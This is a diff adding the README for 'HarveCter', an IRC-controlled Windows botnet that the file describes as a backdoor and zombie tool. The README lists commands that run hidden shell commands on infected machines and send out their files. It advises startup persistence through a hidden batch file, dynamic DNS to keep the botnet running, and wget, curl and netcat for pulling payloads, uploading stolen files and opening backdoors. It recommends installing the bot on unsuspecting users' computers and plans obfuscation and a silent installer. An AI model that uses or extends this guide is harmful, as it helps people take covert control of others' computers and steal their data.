@@ -1,0 +1,125 @@
+ <>=========================================================== 1001 1001 1011 1110 0000 01101 1110 ===<>
+                   ___          ___          ___                                 ___     
+                  /__/\        /  /\        /  /\         ___       ___         /  /\    
+                  \  \:\      /  /::\      /  /::\       /__/\     /  /\       /  /:/_   
+                   \__\:\    /  /:/\:\    /  /:/\:\      \  \:\   /  /:/      /  /:/ /\  
+               ___ /  /::\  /  /:/~/::\  /  /:/~/:/       \  \:\ /__/::\     /  /:/ /:/_ 
+              /__/\  /:/\:\/__/:/ /:/\:\/__/:/ /:/___ ___  \__\:\\__\/\:\__ /__/:/ /:/ /\
+              \  \:\/:/__\/\  \:\/:/__\/\  \:\/::::://__/\ |  |:|   \  \:\/\\  \:\/:/ /:/
+               \  \::/      \  \::/      \  \::/~~~~ \  \:\|  |:|    \__\::/ \  \::/ /:/ 
+                \  \:\       \  \:\       \  \:\      \  \:\__|:|    /__/:/   \  \:\/:/  
+                 \  \:\       \  \:\       \  \:\      \__\::::/     \__\/     \  \::/   
+                  \__\/        \__\/        \__\/          ~~~~                 \__\/    
+ 
+ <>===== IRC Bot ================================================================ <-- Harvie 2oo7 ====<>
+ <>                                                                                                   <>
+ <>  <>GENERAL                                                                                        <>
+ <>   Name:                  HarveCter                                                                <>
+ <>   Subject:               IRC Bot                                                                  <>
+ <>   Description:           Remote Control/Backdoor/Zombie/etc... Everything is controled by IRC     <>
+ <>   Version:               1.0                                                                      <>
+ <>                                                                                                   <>
+ <>  <>DETAILS                                                                                        <>
+ <>   Platform:              Microsoft Windows (Tested on 2000, XP SP1, XP SP2)                       <>
+ <>   Language:              Ansi C + Few windows libs (Windows & WinSock)                            <>
+ <>   Author:                <-- Harvie                                                               <>
+ <>   Date:                  2oo7                                                                     <>
+ <>   Contact:               Harvie@irc.2600.net                                                      <>
+ <>                                                                                                   <>
+ <>=====0=======================================================================================1=====<>
+ <>======0=======================================================================================1====<>
+ <>====000=============================================================== <-- Harvie 2oo7 =====111====<>
+
+ <>===== INFO ================================================ 1001 1001 1011 1110 0000 01101 1110 ===<>
+ 
+ <>Building info:
+Optimalized for Dev-Cpp.
+Compile as windows GUI app. to make a daemon.
+
+ <>Warnings:
+There is not so big security!!!
+If you want to keep your zombies,
+control them only by PM or at completely secure channel!!!
+All passwords, that are starting with your password will be accepted!!!
+If you want to keep your botnet use Dynamic IRC server maping (by Dynamic DNS),
+rather than sending bots directly to one server (as irc.2600.net:6667)!!!
+
+ <>Setting up:
+- You can do all settings in source.
+- for better security use a different password for channel and bots.
+
+ <>Commands:
+- Warning: all commands are case sensitive
+
+- !login [login]              //Bad login=logout
+- !chanpass                   //Set mode +k (each bot sends this when connected)
+
+ <>Privileged commands (needs login)
+- !SAY [msg]                  //Say msg
+- !CMD [shell command]        //Execute command @ bot (hidden console window)
+- !CMD start [shell command]  //Execute command @ bot (show console window)
+- !head [file to send]        //Send few (maxlines_to_send) lines of file
+- !raw [line to send]         //Sends raw line to server (you can OP yourself)
+- !info                       //Info about zombie
+- !time                       //Local time @ zombie
+- !show                       //Show console window
+- !hide                       //Hide console window
+- !restart                    //Restart connection to server
+- !respawn                    //Restart whole zombie
+
+ <>Startup commands:
+Each time when the bot starts, he executes the "hircb.rc.bat" file - hidden (UTFS).
+
+ <>More functions:
+If you want to add more functions to this bot, you can add them direct to the code,
+or you can simple add executable binaries to its directory (!CMD binary.exe).
+This binary must be fully controlled from CLI (command line).
+
+ <>Recommended binaries to add:
+- Wget (wget.exe)   - Allows you to download files from http & ftp (add functions online...)
+- cURL (curl.exe)   - Allows you to upload files to your server (needs some php scripts...)
+
+ <>Another usefull binaries:
+- NetCat (nc.exe)   - Useful (Easy Networking, Firewall test, Backdoor, etc...) - you know...
+- Servers           - FTP(SlimFTPd), HTTP(you can strip Apache), SMTP, SOCKS, Proxy
+- Runtimes          - Unix(CygWin), Java(JArX) PHP, Perl, Python
+- NirCMD2           - (nircmdc.exe) Work with special windows features (mouse,gui,system functions,...)
+- CLAmp (clamp.exe) - Winamp Control (Yeah! What do you expected???)
+- Anything else     - DoS, mailing (Don't do any ilegal stuff with this - just testing!!!)
+
+ <>Recommendations:
+- Use some free DNS service to move zombies across servers.
+- Take very big care about channel security.
+- Install this bot only at n00bz' computers, because there is no encryption
+   (anybody else can sniff and get passwords, etc...)
+
+ <>Version history:
+- future  - Maybe some bugfixes
+- 1.0     - Fixed for overflows, checked bounds, etc..., reformated/reidented source
+- 1.0bRC1 - Implemented Connection checker (new thread), Implemented "!line"
+- 1.0b    - Bugfixes (cmdfile), Implemented "!respawn"
+- 0.9     - Executing hircb.rc.bat at startup, first use "In the Wild" -> found bugs, need "!respawn"
+- 0.8     - Hidden execution
+- 0.7     - Implemented "!info" & "!time"
+- 0.6     - Implemented "!login" function
+- 0.5     - Implemented "!CMD" function
+- other   - I can't remember ;D
+
+ <>To Do:
+- Need SSL to Rock!
+- Binary obfuscation better than UPX
+- Polymorfism?
+- Test binary on "W0W MS OS Vista" (sorry, im running Linux ;)
+- Implement some minimalistic hack, which allows you to download wget
+- Utility for changing bot settings by direct binary patching without recompiling
+- Automatic silent installer
+
+ <>Terms of use:
+- Use it like you want [use, change, abuse]!
+- There is no warranty, because this is free of charge for you!
+- There is no responsibility from side of author, because this is tool only!
+- Only you are responsible for yours acts!
+
+ <>=====0=======================================================================================1=====<>
+ <>======0=======================================================================================1====<>
+ <>====000============================================================= <-- Harvie 2oo7/8 =====111====<>
